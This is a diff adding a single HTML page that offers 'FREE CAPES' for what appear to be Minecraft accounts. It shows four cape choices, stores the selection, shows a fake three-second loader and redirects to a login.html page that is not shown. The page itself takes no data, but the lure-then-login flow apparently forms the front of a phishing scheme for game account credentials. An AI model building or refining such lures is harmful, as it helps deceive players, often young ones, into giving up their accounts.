@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>FREE CAPES</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: url('https://wallpapercave.com/wp/wp6058956.jpg') no-repeat center center fixed;
+      background-size: cover;
+      margin: 0;
+      padding: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      color: white;
+    }
+
+    .title {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+
+    .title h1 {
+      font-size: 48px;
+      font-weight: bold;
+      margin: 0;
+      color: #ffffff;
+      text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
+    }
+
+    .title h2 {
+      font-size: 24px;
+      margin: 8px 0 30px;
+      color: #ccc;
+      text-shadow: 1px 1px 5px rgba(0,0,0,0.5);
+    }
+
+    .container {
+      display: flex;
+      gap: 25px;
+      background-color: rgba(0, 0, 0, 0.6);
+      padding: 30px;
+      border-radius: 15px;
+      justify-content: center;
+      flex-wrap: wrap;
+    }
+
+    .option {
+      border: 3px solid transparent;
+      border-radius: 12px;
+      overflow: hidden;
+      transition: 0.3s ease;
+      cursor: pointer;
+      background-color: #222;
+      box-shadow: 0 6px 14px rgba(0, 0, 0, 0.6);
+      width: 180px;
+    }
+
+    .option img {
+      width: 100%;
+      height: 150px;
+      object-fit: cover;
+      display: block;
+      transition: 0.3s ease;
+    }
+
+    .option input {
+      display: none;
+    }
+
+    .option label {
+      display: block;
+      padding: 10px;
+      text-align: center;
+      font-weight: bold;
+      color: #eee;
+      transition: 0.3s ease;
+    }
+
+    .option input:checked + img {
+      filter: brightness(0.6);
+      transform: scale(1.02);
+    }
+
+    .option input:checked ~ label {
+      background-color: #0ac0ff;
+      color: #000;
+      font-weight: 900;
+    }
+
+    .option:hover {
+      transform: scale(1.03);
+      border-color: #0ac0ff;
+    }
+
+    .select-btn {
+      margin-top: 30px;
+      padding: 12px 30px;
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      background-color: #1e88e5;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .select-btn:hover {
+      background-color: #1565c0;
+    }
+
+    /* Loader Styles */
+    #loader {
+      display: none;
+      margin-top: 30px;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0ac0ff;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="title">
+    <h1>FREE CAPES</h1>
+    <h2>Select a Cape</h2>
+  </div>
+
+  <form class="container" id="capeForm">
+    <div class="option">
+      <input type="radio" name="selection" id="opt1" value="Home Cape" required>
+      <label for="opt1">
+        <img src="https://imgproxy.eneba.games/n01QO0qrhkdha3wvHO73azSRwDgNhyj3MAlDSzEYN4o/rs:fit:350/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy9K/TFBwUDRPcDJTTU0x/Y2otWmktdFdkaURp/X0QxNUg3dDRPMHJs/MnVkMFJ3LmpwZw" alt="Home Cape">
+        Home Cape
+      </label>
+    </div>
+
+    <div class="option">
+      <input type="radio" name="selection" id="opt2" value="Menace Cape">
+      <label for="opt2">
+        <img src="https://imgproxy.eneba.games/OtIKhYRiKyHDwGFgdUNMJdyrhIluVIJVj3vuuycTy64/rs:fit:350/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy82/aU1SSi1sY3J6WnNV/THFKTlVRRHhlSEJH/V0JaaWJXR3JfTk9n/b0daaG5VLmpwZw" alt="Menace Cape">
+        Menace Cape
+      </label>
+    </div>
+
+    <div class="option">
+      <input type="radio" name="selection" id="opt3" value="Purple Heart Cape">
+      <label for="opt3">
+        <img src="https://imgproxy.eneba.games/NaE_K6LjO2CBdhRRZWEUzEwsBXAhnorCiRP4ZQxrhw0/rs:fit:350/ar:1/czM6Ly9wcm9kdWN0/cy5lbmViYS5nYW1l/cy9wcm9kdWN0cy9Q/bVBvYzItTjVBazZv/Tm5hOEJ5TEVUYkpR/Q1FaaDZOWmtYUVcx/Ul8zR05zLmpwZw" alt="Lava Cape">
+        Purple Heart Cape
+      </label>
+    </div>
+
+    <div class="option">
+      <input type="radio" name="selection" id="opt4" value="TikTok Cape">
+      <label for="opt4">
+        <img src="https://www.bisecthosting.com/blog/wp-content/uploads/2024/05/MinecraftTikTokCape.webp" alt="TikTok Cape">
+        TikTok Cape
+      </label>
+    </div>
+  </form>
+
+  <button class="select-btn" onclick="goToLogin()">Select</button>
+
+  <div id="loader"></div>
+
+  <script>
+    function goToLogin() {
+      const selected = document.querySelector('input[name="selection"]:checked');
+      if (!selected) {
+        alert("Please select a cape first!");
+        return;
+      }
+
+      localStorage.setItem("selectedCape", selected.value);
+
+      // Show loader
+      document.getElementById("loader").style.display = "block";
+
+      // Wait 3 seconds, then redirect
+      setTimeout(() => {
+        window.location.href = "login.html";
+      }, 3000);
+    }
+  </script>
+
+</body>
+</html>
